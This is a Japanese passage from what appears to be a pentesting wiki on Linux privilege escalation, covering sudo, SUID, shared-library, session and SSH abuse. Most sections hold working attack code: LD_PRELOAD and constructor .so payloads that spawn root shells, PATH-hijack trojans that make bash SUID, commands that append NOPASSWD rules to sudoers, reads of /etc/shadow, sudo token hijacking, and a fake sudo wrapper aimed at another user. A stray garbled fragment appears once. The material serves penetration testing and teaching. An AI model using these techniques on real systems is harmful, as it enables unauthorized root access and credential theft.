特定のsudoルールで環境変数が保持される場合、Terraformの変数は`TF_VAR_<name>`環境変数を通じて指定できます。ソースsymlinkからの**読み取り**には、そのリンクをたどり、保護されたファイルの内容を呼び出し元が読み取れる宛先にコピーするproviderも必要です。宛先symlinkへの**書き込み**には、呼び出し元が制御できる宛先エントリと、書き込み時にリンクをたどる特権providerが別途必要です。その後に実行されるscheduled jobは、起こりうる結果の一つにすぎません。どちらの方法も試す前に、`sudo -l`、`stat`、`readlink`などの読み取り専用コマンドで、sudoの許可内容、関連する`.tf`ファイル、選択中のCLI config、パスの所有者を確認してください。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`のような脆弱な字句検証では、symlinkは解決されません:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform はシンボリックリンクを解決し、実際の `/root/root.txt` を攻撃者が読み取り可能な宛先にコピーします。同じ方法で、宛先のシンボリックリンクをあらかじめ作成しておけば、特権パスへの**書き込み**にも利用できます（例: プロバイダーの宛先パスを `/etc/cron.d/` 内に向ける）。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudo に `requiretty` を設定し、対話型 TTY からのみ実行できるようにする場合があります。`!requiretty` が設定されている場合（またはこのオプションが設定されていない場合）、reverse shell、cron ジョブ、スクリプトなどの非対話型コンテキストから sudo を実行できます。

```bash
Defaults !requiretty
```

これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH`、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が表示される場合、sudo で許可された対象内の、パスを指定していない外部コマンドが別のコマンドに置き換えられる可能性があります。<sup>[[3]](#references)</sup> 有効な `secure_path` が存在しない場合も、sudo の環境で呼び出し元が制御する `PATH` が保持される**場合に限り**、確認する価値があります。存在しないことだけでは、保持されるとは証明できません。許可されたスクリプトを実行せずに読み、そのうえで正確な RunAs と引数のルール、有効なコマンド検索パス、およびコマンド名を含む、より優先順位が高く書き込み可能で、ディレクトリを通過できる場所を確認してください。認証、`NOEXEC`、シェル組み込みコマンド、絶対パスで指定されたコマンドによって、結果が変わる場合があります。

- 要件: 絶対パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプト/バイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、最初に検索される書き込み可能な PATH エントリ。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudoの実行でパスをバイパスする
他のファイルを読み取るには **Jump** を使うか、**symlinks** を使います。たとえば、sudoersファイルに次のように記述します: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**ワイルドカード**（\*）が使用されている場合は、さらに簡単です：

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定しない Sudo コマンド/SUID バイナリ

単一のコマンドに対して**sudo 権限**が付与されており、**パスが指定されていない**場合（例: _hacker10 ALL= (root) less_）、PATH 変数を変更して悪用できます。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合にも使用できます（奇妙な SUID バイナリの内容は必ず** _**strings**_ **で確認してください）**。

[実行する Payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### コマンドのパスを指定する SUID バイナリ

**suid** バイナリが**パスを指定して別のコマンドを実行する場合**は、その SUID ファイルが呼び出すコマンド名で関数を**export**してみてください。

たとえば、SUID バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合は、関数を作成して export します。

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

その後、SUIDバイナリを呼び出すと、この関数が実行されます

### カスタム SUID コピー wrapper

ソースパスと宛先パスを受け取るroot所有のSUIDユーティリティは、2つの異なる信頼境界を越える可能性があります。いずれかの引数からshellコマンドを組み立てる場合（たとえば、組み立てた`cp`コマンドを`system()`に渡す場合）、shellのメタ文字によって、有効な権限で別のコマンドが実行される可能性があります。shellを使わずに`cp`を安全に呼び出していても、宛先に制限がなければ、`/etc/passwd`などのファイルへ任意の内容を特権付きで書き込める可能性があります。wrapperの引数処理、有効UIDの動作、宛先の制限、コピーされるファイルの内容を呼び出し側が制御できるかを確認してください。`cp`の一般的なエラーやSUIDビットだけでは、どちらの経路も証明できません。手動テストを行う前に、バイナリと権限を受動的に列挙してください。

### SUID wrapperによって実行される書き込み可能なスクリプト

よくあるカスタムアプリの設定ミスとして、root所有のSUIDバイナリwrapperがスクリプトを実行し、そのスクリプトがlow-privユーザーによって書き込み可能になっているケースがあります。

典型的なパターン:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` に書き込み可能であれば、payload コマンドを追記してから SUID wrapper を実行できます。

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

簡易チェック:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

この攻撃経路は、`/usr/local/bin` に配置された「maintenance」/「backup」ラッパーで特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダーが他のすべてのライブラリより先に読み込む共有ライブラリ（.so ファイル）を1つ以上指定するために使われます。これには標準Cライブラリ（`libc.so`）も含まれます。この処理は、ライブラリのプリロードと呼ばれます。

ただし、システムのセキュリティを維持し、この機能が悪用されるのを防ぐため、特に **suid/sgid** 実行ファイルでは、システムによって次の条件が適用されます。

- 実ユーザーID（_ruid_）と実効ユーザーID（_euid_）が一致しない実行ファイルでは、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid が設定された実行ファイルでは、標準パスにあり、かつ suid/sgid が設定されたライブラリのみがプリロードされます。

`sudo` を使ってコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、権限昇格が可能になることがあります。この設定により、`sudo` でコマンドを実行する際も **LD_PRELOAD** 環境変数が保持され、認識されるため、昇格した権限で任意のコードが実行される可能性があります。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** として保存します。

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

次に、以下を使用して**コンパイルします**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最後に、**権限昇格**を実行する

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御できる場合、ライブラリの検索先となるパスを指定できるため、同様の privesc を悪用できます。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUIDバイナリ – .so injection

通常とは異なる **SUID** 権限を持つバイナリを見つけた場合、**.so** ファイルが正しく読み込まれているか確認することをおすすめします。次のコマンドを実行して確認できます。<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

たとえば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーが発生した場合、exploitできる可能性があります。

これをexploitするには、たとえば _"/path/to/.config/libcalc.c"_ というCファイルを作成し、次のコードを記述します。

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でシェルを実行することで、権限の昇格を試みます。

上記の C ファイルを、次のコマンドで shared object（.so）ファイルにコンパイルします。

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最後に、影響を受ける SUID バイナリを実行すると exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

書き込み可能なディレクトリからライブラリを読み込む SUID バイナリが見つかったので、そのディレクトリに必要な名前でライブラリを作成しましょう:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

次のようなエラーが発生した場合】【。

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリを集めたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数のみを注入できる**場合を対象とした同様のリストです。

このプロジェクトでは、制限付きシェルからの脱出、権限昇格や高い権限の維持、ファイル転送、bind shell や reverse shell の起動、その他の post-exploitation タスクに悪用できる、Unix バイナリの正規の機能を集めています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo のルールを悪用する方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo アクセス**はあるもののパスワードがない場合、**sudo コマンドが実行されるのを待ってからセッショントークンを乗っ取る**ことで権限昇格できます。<sup>[[18]](#references)</sup>

権限昇格の要件:

- すでにユーザー "_sampleuser_" としてシェルを取得している
- "_sampleuser_" が**過去15分以内に**何かを実行するために `sudo` を**使用している**（デフォルトでは、パスワードを入力せずに `sudo` を使えるトークンの有効期間が15分）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` が利用可能（アップロードしてもよい）

（一時的に `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` で `ptrace_scope` を有効にするか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` を設定すれば、永続的に有効にできます）

これらの要件をすべて満たしていれば、こちらを使って**権限昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って**自分のセッションで sudo トークンを有効化**できます（自動的に root shell が得られるわけではありません。`sudo su` を実行してください）:

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **2つ目の exploit** (`exploit_v2.sh`) は、_/tmp_ に **root 所有で setuid が設定された** sh shell を作成します。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **3つ目のexploit**（`exploit_v3.sh`）は、**sudoersファイルを作成**し、**sudoトークンを無期限にして、すべてのユーザーがsudoを使えるようにします**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

フォルダー、またはフォルダー内に作成されたファイルのいずれかに**書き込み権限**があれば、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、ユーザーと PID を指定して **sudo token を作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても、次の操作で **sudo 権限を取得**できます:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルでは、`sudo` を使用できるユーザーとその使用方法を設定します。これらのファイルは、**デフォルトでは root ユーザーと root グループのみが読み取り可能です**。\
**このファイルを読み取り可能であれば**、**興味深い情報を取得できる**可能性があります。また、いずれかのファイルに**書き込み可能であれば**、**権限昇格**が可能になります。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

書き込みが可能なら、この権限を悪用できます。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

これらの権限を悪用する別の方法：

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD には `doas` など、`sudo` バイナリの代替手段があります。`/etc/doas.conf` の設定を確認することを忘れないでください。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas`でエディタやインタープリターの実行が許可されている場合は、GTFOBins形式のエスケープを確認します。

```bash
doas vim
:!/bin/sh
```

root 権限で実行可能な `doas` ルールがある場合は、元の Python ベースの `dstat` のプラグインパスも確認する価値があります。[マニュアル](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)と[ソース](https://github.com/dstat-real/dstat/blob/master/dstat)には、`dstat_*.py` プラグインの配置場所として `/usr/share/dstat/` と `/usr/local/share/dstat/` が記載されています。現在のユーザーが、インストール済みビルドで実際に使われる場所への書き込みと検索を行える場合、選択したプラグインが `doas` の RunAs ID で実行される可能性があります。有効なルール、そのビルドでのプラグイン検索方法、ディレクトリと親ディレクトリの権限または ACL、呼び出し元がプラグインを選択できるかを確認してください。`dstat` ルールや書き込み可能なディレクトリだけでは、あくまで調査の手がかりにすぎません。別の `dstat` 実装では、異なるプラグインシステムが使われることがあります。プラグインを読み込まず、メタデータを受動的に確認してください。

### Sudo Hijacking

**ユーザーが通常、マシンに接続して `sudo` を使い**権限昇格することがわかっており、そのユーザーのコンテキストでシェルを取得している場合、root としてコードを実行した後にユーザーのコマンドを実行する**新しい sudo 実行ファイルを作成できます**。次に、ユーザーのコンテキストの **$PATH を変更**します（たとえば、`.bash_profile` に新しいパスを追加します）。これにより、ユーザーが sudo を実行したときに、作成した sudo 実行ファイルが実行されます。

ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) に別の例があります。

または、次のようなものを実行します。

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共有ライブラリ

### ld.so

`/etc/ld.so.conf` ファイルは、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリを検索する**他のフォルダを**指定します**。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で、**ユーザーが** `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定された任意のフォルダに書き込み権限を持っている場合、権限昇格が可能になることがあります。\
次のページで、**この設定ミスを悪用する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているとおり、この場所にあるプログラムによって使用されます。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

次に、`/var/tmp` に悪意のあるライブラリを作成します。`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilitiesは、プロセスに対して**利用可能なroot権限の一部を提供**します。これにより、rootの**権限がより小さく、個別の単位に分割**されます。これらの単位はそれぞれ、プロセスに独立して付与できます。この方法により、権限の全体的な範囲が縮小され、悪用のリスクが低減します。\
次のページを読んで、**capabilitiesとその悪用方法について詳しく学んでください**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**「execute」ビット**によって、そのユーザーがフォルダーに「**cd**」できることを示します。\
**「read」**ビットはユーザーが**ファイルを一覧表示**できることを示し、**「write」**ビットはユーザーが新しい**ファイルを作成**したり、既存の**ファイルを削除**したりできることを示します。

## ACLs

Access Control Lists (ACLs)は、任意アクセス制御における二次的な権限レイヤーであり、従来のugo/rwx権限を**上書きできます**。これらの権限により、所有者ではないユーザーやグループに属していないユーザーに対して、権限を許可または拒否できるため、ファイルやディレクトリへのアクセス制御を強化できます。この**詳細な制御により、より正確なアクセス管理が可能になります**。詳しくは[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)をご覧ください。<sup>[[19]](#references)</sup>

ユーザー「kali」にファイルの読み取りおよび書き込み権限を**付与**します:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

システムから特定のACLを持つファイルを**取得**する：

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-inに隠されたACLバックドア

よくある設定ミスは、`/etc/sudoers.d/` 内にモード `440` で配置されたroot所有のファイルが、ACLによって低権限ユーザーにも書き込みを許可していることです。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` のような設定がある場合、mode bits が制限されていても、そのユーザーは sudo ルールを追記できます。

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

これは影響の大きい ACL による永続化/privesc 経路です。`ls -l` だけを使ったレビューでは見落としやすいためです。

## オープンなシェルセッション

ユーザー間での GNU Screen アクセスは、バージョンだけでなく、**実行中のセッションの設定と ACL** に依存します。[GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) によると、multiuser サポートを有効にしてビルドする必要があります。また、`multiuser on` と `acladd`、または適切な `aclchg` による許可があれば、別のユーザーが接続できます。[The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) は、ユーザー間セッションの検索に setuid-root も必要としています。root 所有のソケットが見えることや、SUID の `screen` バイナリがあることだけでは、接続可能な root シェルが存在するとは言えません。エスカレーションと判断する前に、実行中のセッションが multiuser であること、現在のユーザーに実効的な入力/コマンド権限があること、そのセッション内のシェルが特権所有者として実行されていることを確認してください。

### screen sessions hijacking

**screen セッションを一覧表示する**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen セッションの乗っ取り - ソケットの場所（一部のシステムでは、一方がもう一方のシンボリックリンクとして公開される）: ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続する**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションを乗っ取ることはできませんでした。

**tmux セッションを一覧表示する**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![ソケットの場所（一部のシステムでは、一方がもう一方のシンボリックリンクとして公開されます）- tmux sessions hijacking: tmux -S /tmp/dev sess ls このソケットを使って一覧表示します。このソケットで tmux セッションを開始できます...](<../../images/image (837).png>)

**セッションに接続する**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

HTBの **Valentine box** を例として確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

脆弱性があった歴史的な期間に、影響を受ける Debian またはその派生版の OpenSSL ビルドで生成された鍵は、予測可能な乱数を使用している可能性があります。ホストの現在のディストリビューションや、パッチ適用済みの OpenSSL バージョンだけでは、古い鍵がどのように生成されたかは判断できません。適切な過去のブラックリストとその由来に照らして、**対象の鍵**を確認してください。Debian の [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) では、公開鍵と `authorized_keys` の確認方法が説明されており、[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) には OpenSSL の修正が記録されています。特権アカウントの `authorized_keys` にエントリがあっても、対応する秘密鍵を入手でき、実効 SSH ポリシーでそのアカウントへの鍵認証が許可されている場合に限り、権限昇格の手掛かりになります。弱い **ホスト**鍵自体はログイン認証情報ではありません。侵害された鍵を交換し、古い鍵の認可を削除してください。

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。上流 OpenSSH のデフォルトは `yes` ですが、ディストリビューションの設定で上書きされる場合があります。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### ログイン制御ファイル

これらのファイルは、ログインできるユーザーやログイン方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外のログインを拒否し、メッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY の許可リスト）。
- **`/etc/motd`**: ログイン後に表示するバナーです（環境情報やメンテナンス情報を leak する可能性があります）。

### PermitRootLogin

ssh を使った root のログインを許可するかどうかを指定します。上流 OpenSSH のデフォルトは `prohibit-password` ですが、ディストリビューションの設定で上書きされる場合があります。指定可能な値は次のとおりです。

- `yes`: root はパスワードまたは秘密鍵を使ってログインできます
- `without-password` または `prohibit-password`: root は秘密鍵でのみログインできます
- `forced-commands-only`: root は秘密鍵を使い、コマンドオプションが指定されている場合にのみログインできます
- `no` : 不可

### 信頼された SSH ユーザー証明書認証局

`TrustedUserCAKeys` は、sshd が **ユーザー**証明書への署名に使用するものとして信頼する公開鍵を指定します。対応する秘密 CA 鍵を低権限ユーザーが読み取れる場合は、誰が証明書を取得できるか、またどのアカウントのプリンシパルとして認証できるかを確認してください。`AuthorizedPrincipalsFile` または `AuthorizedPrincipalsCommand` で受け入れる名前を制限できます。どちらも設定されていない場合、証明書には対象アカウント名が含まれている必要があります。`PermitRootLogin prohibit-password` は root のパスワード認証をブロックしますが、証明書認証は許可する場合があります。鍵のパスが露出しているだけではアクセスできる証拠にはなりません。公開鍵と秘密鍵のペア、実効 `Match` ルール、アカウントポリシー、鍵のパスフレーズ、失効状況、受け入れ可能な署名アルゴリズムを確認してください。列挙結果に秘密鍵のバイト列を含めないでください。[OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) を参照してください。

現在のユーザーが読み取れない秘密 CA 鍵でも、権限委譲ルールによって、そのユーザーが鍵の所有者の権限で制限のない [証明書署名ツール（`ssh-keygen -s` など）](https://man.openbsd.org/ssh-keygen#-s) を実行できる場合は、利用できることがあります。許可されているコマンドと引数を正確に確認し、署名アカウントが鍵にアクセスできるか、実効 sshd 設定で公開 CA が信頼されているか、対象アカウントでどのプリンシパルが受け入れられるか、証明書の有効期間、およびそのアカウントのログインポリシーと照合してください。委譲された署名コマンドや信頼された CA ファイルがあるだけでは、別のアカウントにアクセスできる証拠にはなりません。受動的な列挙中にテスト証明書へ署名しないでください。

アカウントごとの別個の CA 信頼経路については、[SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion) を参照してください。

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` などのトークンを含められます。**絶対パス（`/` で始まるパス）** または **ユーザーのホームディレクトリからの相対パス**を指定できます。例:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

その設定では、ユーザー「**testusername**」の**秘密鍵**でログインしようとすると、ssh はその鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にある公開鍵と照合します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使うと、サーバー上に（パスフレーズのない！）鍵を置いたままにせず、**ローカルの SSH keys を使用**できます。そのため、ssh で**ホストに jump**し、そこから**最初のホストにある****鍵を使用して**、さらに**別のホストに jump**できます。

このオプションを `$HOME/.ssh.config` に次のように設定します。

```
Host example.com
  ForwardAgent yes
```

`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできるようになる点に注意してください（これはセキュリティ上の問題です）。

`/etc/ssh_config` ファイルでは、これらの **options** を**上書き**して、この設定を許可または禁止できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` を使って ssh-agent forwarding を**許可**または禁止できます（デフォルトは許可）。

環境で Forward Agent が設定されていることが分かった場合は、次のページを参照してください。**権限昇格に悪用できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

`/etc/profile` ファイルと `/etc/profile.d/` 以下のファイルは、**ユーザーが新しい shell を起動すると実行されるスクリプト**です。そのため、これらのファイルのいずれかに**書き込みまたは変更ができれば、権限昇格が可能です**。

```bash
ls -l /etc/profile /etc/profile.d/
```

不審な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OS によっては、`/etc/passwd` ファイルや `/etc/shadow` ファイルの名前が異なっていたり、バックアップが存在したりする場合があります。そのため、これらのファイルを**すべて探し**、**読み取り可能か確認**して、ファイル内に**ハッシュがあるか**調べることをおすすめします。

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 書き込み可能な /etc/passwd

まず、以下のコマンドのいずれかでパスワードを生成します。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

次にユーザー hacker を追加し、生成されたパスワードを設定します。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

